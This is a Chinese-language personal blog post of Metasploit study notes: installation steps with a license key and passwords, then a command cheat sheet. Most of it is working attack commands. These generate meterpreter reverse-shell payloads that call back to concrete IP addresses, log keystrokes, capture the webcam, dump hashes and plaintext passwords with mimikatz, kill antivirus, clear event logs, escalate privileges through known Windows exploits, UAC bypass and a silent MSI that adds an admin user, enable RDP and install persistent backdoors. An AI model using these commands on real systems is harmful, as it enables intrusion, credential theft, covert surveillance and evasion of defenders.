---
layout:		post
title:		"metasploit学习笔记"
subtitle:		"分享一下以前写的msf笔记"
date:		2017-06-08 23:21:49 +0800
author:		"Les1ie"
tags: 
  - 学习笔记
  - metasploit
  - 网络安全
---

## 0x00 序言
2017年6月8日23:26:39 
这是平时记的笔记，后面有空了继续分享一些有趣的东西


## 0x01 在服务器上安装msf
2017年4月23日01:07:30

手动安装msf
```bash
$ #url: https://www.rapid7.com/products/metasploit/download/community/thank-you/
$ wget https://downloads.metasploit.com/data/releases/metasploit-latest-linux-x64-installer.run
$ #key 8TD3-KQ09-HLP0-EVJR
$ apt install postgresql
$ passwd postgres #metasploit4
$ su - postgres
$ psql
[psql]$ \password postgres
[psql]$ \quit
$ sudo ./metasploit-latest-linux-x64-installer.run --installer-language zh_CN --prefix /opt/metasploit --postgres_password psql_passwd
$ #建立数据库连接
$ db_connect postgres:metasploit4@localhost:5432/metasploit4
```

---
msf连接数据库
```bash
msfdb init
```

建立数据库索引
```
$ db_bebulid cache
```

msf自定义模块安装位置
`/opt/metasploit/apps/pro/vendor/bundle/ruby/2.3.0/gems/metasploit-framework-4.14.13/modules/exploits/windows/iis`



## 0x01 常用命令

1. 使用reverse_tcp监听模块
```bash
$ use exploit/multi/handler
$ set PAYLOAD windows/meterpreter/reverse_tcp
$ show options
$ set LHOST 0.0.0.0
$ set LPORT 5555
```
2. 生成reverse_tcp模块，-p 表示使用的payload, -f 表示生成shellcode的种类
```bash
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=123.207.2.2 LPORT=5555 -f exe >shell.exe  
$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=123.207.1.2 LPORT=5555 -f dll >shell.dll
```
3. meterpreter的使用
```bash
$ ps  # show all progress
$ kill pid
$ keyscan_start # start record keyboard
$ keyscan_dump
$ keyscan_stop
$ ipconfig
$ ifconfig
$ screenshot 
$ shell  # get cmd shell
$ getsystem  #get root
$ getwd   # get path
$ pwd
$ sysinfo
$ cat file.txt
$ idletime # time of no operate
$ search -h  # search file
$ upload /root/file.txt
$ webcam_snap # you know
$ run check_kvm  # check virtue machine or not
$ run get_local_subnets
$ run post/windows/manage/autoroute #获取路由信息
$ run post/windows/gather/smart_hashdump #get system passwd， need root
$ migrate 2333 #move meterpreter to another progess
$ timestop #change timestamp
$ run killav #kill anti virus software
$ run post/windows/gather/checkvm
```


提权：
```cmd
getsystem 获取system权限
$ getuid 查看当前权限
$ shell
> net user fdf6e3 fdf6e4 /add
> net localgroup adminstrator fdf6e3 /add   新建用户提升至管理员权限

```
盗取管理员token
```
$ steal_token 3232
$ getuid
```

获取管理员密码
```
$ hashdump
$ smart_hashdump  ? 不详， 稍后查验
```

开对方3389
```
$ run getgui -e
$ rdesktop -u fdf6e3 -p fdf6 ip

```

如果上述提权均失败，尝试手动提权
```
$ background # 将会话放到后台运行
$ use exploit/windows/local/ms15_051_client_copy_image
$ set SESSION 1 直接设置session id, 
$ exploit
$
$ sessions -i 1 返回meterpreter会话，
$ getuid 此时权限一般不是管理员
$ ps 找一个system的进程pid
$ migrate 2324
$ getuid
```

获取对方最近文件操作
```
run post/windows/gather/dumplinks
```

载入mimikatz获取明文密码
```
$ load mimikatz
$ msv 确认当前权限
$ kerberos 导出明文密码
$ mimikatz_command -f sekurlsa::searchPasswords 获取明文密码
```

清理痕迹
```
$ clearev
```

AlwaysInstallElevated 提权
```
$ cmd 里面执行
$ reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated


$ reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

$ #生成msi文件用于提权
$ msfvenom -p windows/adduser USR=fdf6e4 PASS=ABCDEF -f msi -o add_user.msi
$ upload add_user.msi c:\\add.msi
$ 使用msiexec 安装msi文件
$ msiexec /quit /qn /i c:\add_user.msi
/quit 表示禁止发送消息 /qn 表示禁止gui界面 /i 表示安装程序
$ net localgroup administrator 查看当前计算机的管理员

$ 开启对方3389
$ wmic RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call SetAllowTSConnections 1
```

绕过uac提权
```
$ background
$ use exploit/windows/local/bypassuac
$ set session 1
$ exploit
$ getuid
$ getsystem
$ getuid
```

其他提权漏洞
 ms13_053, ms14_058, ms16_016, ms16_032
 
 权限维持,在meterpreter中执行
 ```
 $ run metsvc -A
 $ 此时meterpreter 掉线，按照提示新建连接
 $ use exploit/multi/handler
 $ set payload windows/metsvc_bind_tcp
 $ set port 33333
 $ run
```
控制完成
退出第一个meterpreter, 输入
```
$ session -l
```
即可看到rj, 输入 
```
$ session -i id
```
即可长期控制


实际操作中，getsystem提权和bypassuac 提权失败，使用ms15_051运行之后需要将会话转移到一个system的进程中，最后ms14_058提权成功
检测成功只需要检测当前路径即可，或者getuid

## 0x02 使用meterpreter搭建跳板
2017年6月8日23:29:25
等以后有空了研究了再写吧
